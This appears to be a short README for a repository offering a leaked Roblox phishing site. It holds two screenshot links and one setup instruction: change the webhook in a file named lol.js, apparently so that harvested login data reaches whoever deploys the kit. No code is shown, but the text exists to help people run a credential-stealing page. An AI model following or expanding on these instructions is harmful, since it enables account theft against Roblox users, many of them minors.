ROBLOX PHISHING SITE LEAK
![image](https://user-images.githubusercontent.com/115323532/195975925-e6d6d1e2-b53b-4bec-a718-313307ed57b4.png)
![image](https://user-images.githubusercontent.com/115323532/195975956-fc2c6930-66b8-40da-8890-f4655bfd1648.png)

Change webhook in lol.js file 😨😨
